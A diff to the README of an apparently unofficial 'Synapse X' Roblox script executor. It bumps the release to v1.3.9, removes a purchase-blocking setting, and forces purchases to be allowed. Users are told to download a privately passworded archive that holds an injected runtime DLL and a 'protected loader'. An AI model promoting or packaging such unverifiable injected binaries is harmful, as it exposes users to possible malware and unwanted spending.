@@ -3,14 +3,25 @@
 An unofficial Synapse X inspired interface for the supplied Windows application.
 This project is not affiliated with the original Synapse X developers.
 
-**[Download Synapse X Executor v1.3.8](https://github.com/j4522419-code/synapse-x-executor/releases/tag/v1.3.8)**
+**[Download Synapse X Executor v1.3.9](https://github.com/j4522419-code/synapse-x-executor/releases/tag/v1.3.9)**
 
 This candidate addresses a possible filename regression in v1.3.4. Live attachment
 on the affected PC is still required to confirm whether it resolves the error.
 
-![Corrected purchase permission controls](docs/permissions-preview.jpg)
+## Version 1.3.9 — remove custom purchase approval
 
-The preview shows the actual Settings component in the browser test harness.
+- Remove the custom **Block in-game purchases** control and its empty Client page.
+- Migrate saved purchase preferences to Allow and always send `BlockPurchases: false`
+  in the native configuration. Fresh packaged settings also set it to false.
+- Wait for the initial native settings update before initialization and automatic
+  attachment finish, so an old saved choice cannot race startup.
+- Keep Roblox's normal purchase confirmation unchanged. This edition no longer
+  provides an additional purchase approval popup.
+
+The runtime DLL and protected loader are byte-for-byte unchanged from v1.3.8.
+The private archive password and archive-only uploaded assets are retained.
+Settings removal, old-preference migration, native configuration, fresh defaults,
+startup and archive integrity were checked without triggering a real purchase.
 
 ## Version 1.3.8 — purchase confirmation visibility
 
@@ -69,9 +80,6 @@ further runtime patches. Live attachment on the affected PC remains untested.
 
 ## Retained interface features
 
-- Fix the **Ask permission / Allow** controls with a correctly sized container,
-  consistent button height, contained selection borders and keyboard focus
-  outlines. At narrow widths the controls move below the description.
 - Add **Game** to Settings with the existing **Enable RakNet** switch. Its saved
   value is preserved; changing it uses the existing runtime setting.
 - Give the native window an explicit taskbar identity and a relaunch command
@@ -86,11 +94,7 @@ further runtime patches. Live attachment on the affected PC remains untested.
   retaining the earlier rules for existing installations. Identity remains
   **SYNAPSE X MADE BY GRAND**; the retained rules report **1.3.4-grand**.
 
-![Game settings](docs/game-preview.jpg)
-
-The permission controls were checked at normal and narrow window widths, in
-both selection states and using the keyboard. RakNet persistence was checked
-after reload. Native taskbar properties, shortcut migration and inner-to-root
+RakNet persistence was checked after reload. Native taskbar properties, shortcut migration and inner-to-root
 startup were tested with first-party fixtures, without launching the supplied
 core. The supplied runtime and live Roblox attachment remain untested.
 
@@ -109,7 +113,7 @@ core. The supplied runtime and live Roblox attachment remain untested.
 
 ## Install
 
-1. Download `Synapse-X-Executor-v1.3.8-windows-x64.7z` from the release’s **Assets**.
+1. Download `Synapse-X-Executor-v1.3.9-windows-x64.7z` from the release’s **Assets**.
 2. Use [7-Zip](https://www.7-zip.org/) to extract the complete archive into a **fresh folder**, using the password shared privately by the distributor.
 3. Restart Roblox to unload an older runtime.
 4. Open the **top-level Synapse X Executor.exe**, keeping the complete `app` folder beside it.
@@ -165,7 +169,7 @@ Updater checks verify no duplicate root bin is recreated. See
 The password-protected release `.7z` is the runnable package. GitHub’s source-code ZIP contains the
 documentation, theme assets and [launcher source](launcher/AttachErrorHost.cs),
 not the full recovered native application source. The executor archive is the
-only uploaded asset on the v1.3.8 release.
+only uploaded asset on the v1.3.9 release.
 
 Tests cover Attach error extraction and propagation, native structured errors,
 the existing channel-repair path, confirmation timeouts, disconnect feedback,
